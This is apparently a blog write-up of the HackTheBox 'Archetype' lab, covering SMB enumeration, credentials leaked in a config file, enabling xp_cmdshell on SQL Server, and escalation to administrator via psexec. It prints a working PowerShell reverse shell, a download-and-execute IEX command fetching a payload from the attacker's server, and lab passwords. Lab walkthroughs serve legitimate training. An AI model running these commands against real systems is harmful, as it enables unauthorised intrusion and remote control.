---
layout: post
title: HackTheBox Archetype 
date: 2021-04-01
categories: [HackTheBox, Windows]
tags: [HackTheBox, Windows]
---

# Enumeration

```bash
┌──(root💀Shiro)-[/home/shiro]
└─# nmap -sC -sV 10.10.10.27
Nmap scan report for 10.10.10.27
Host is up (0.22s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-04-29T03:02:15
|_Not valid after:  2051-04-29T03:02:15
|_ssl-date: 2021-04-29T03:24:14+00:00; +21m54s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h45m54s, deviation: 3h07m50s, median: 21m54s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-04-28T20:24:01-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-29T03:24:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.07 seconds
```
>   Port 445 indicates SMB is running
>   Port 1433 indicates SQL is running

Check if anonymous login available on SMB with ```smbclient -N -L //10.10.10.27/```

-   `-N` indicates skip password

```bash
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```
Let’s enumerate ```backups``` share because it might contain config files with usernames and passwords!
```bash
┌──(shiro㉿Shiro)-[~]
└─$ smbclient -N  //10.10.10.27/backups
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 20:20:57 2020
  ..                                  D        0  Mon Jan 20 20:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 20:23:02 2020

smb: \> get prod.dtsConfig
```
```bash
┌──(shiro㉿Shiro)-[~/HackTheBox/Archetype]
└─$ cat prod.dtsConfig     
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>  
```
There is a ```User ID = ARCHETYPE\sql_svc``` and ```Password = M3g4c0rp123```! 

Since this machine runs Microsoft SQL Server, we can establish a SQL connection with [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)
```bash
┌──(shiro㉿Shiro)-[/opt/impacket/examples]
└─$ python3 mssqlclient.py sql_svc@10.10.10.27 -windows-auth
Impacket v0.9.23.dev1+20210427.174742.fc72ebad - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
```
Let’s use the ```IS_SRVROLEMEMBER``` function to check if we have sysadmin privileges.
```bash
SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
1  

SQL> 
```
To enable code execution, we need ```xp_cmdshell```. To do so, we can follow the tricks [here](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server).
```bash
EXEC sp_configure 'Show Advanced Options', 1; 
reconfigure; 
sp_configure; 
EXEC sp_configure 'xp_cmdshell', 1 
reconfigure; 
xp_cmdshell "whoami"
```
Now we try ```xp_cmdshell "whomai"```
```bash
SQL> xp_cmdshell "whoami"
archetype\sql_svc

SQL> 
```
Since we can run ```xp_cmdshell```, why not try a [powershell reverse-shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)?
```bash
$client = New-Object System.Net.Sockets.TCPClient('YourIP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

$sm=(New-Object Net.Sockets.TCPClient('YourIP',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```
Start a python server using ```sudo python3 -m http.server 80```
Start a listener using ```sudo nc -lvnp 4444```
Run this command to download and execute reverse_shell

```bash
EXEC xp_cmdshell 'echo IEX (New-Object Net.WebClient).DownloadString("http://IP:PORT/reverse_powershell.ps1") | powershell -noprofile'
```
Now the listener should get a shell~
```bash
┌──(shiro㉿Shiro)-[~/HackTheBox/Archetype]
└─$ sudo nc -lvnp 4444                                                   
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.27.
Ncat: Connection from 10.10.10.27:49673.

PS C:\Windows\system32> 
```
Find the user.txt in Desktop folder
```bash
PS C:\Users\sql_svc\Desktop> cat user.txt
3e7b102e78218e935bf3f4951fec21a3
```
# Privilege Escalation
Let's check powershell history to view what were the user's recent actions
```powershell
PS C:\Users\sql_svc\Desktop> (Get-PSReadlineOption).HistorySavePath
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

PS C:\Users\sql_svc\Desktop> cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```
Notice that there’s a username and password `administrator:MEGACORP_4dm1n!!`

Now we can use Impackets's `psexec.py` to connect to the server!

```bash
┌──(shiro㉿Shiro)-[/opt/impacket/examples]
└─$ python3 psexec.py administrator@10.10.10.27     
Impacket v0.9.23.dev1+20210427.174742.fc72ebad - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file ComteUOV.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service XzGJ on 10.10.10.27.....
[*] Starting service XzGJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
Now we can find the root.txt file!
```bash
C:\Users\Administrator\Desktop>type root.txt
b91ccec3305e98240082d4474b848528
```
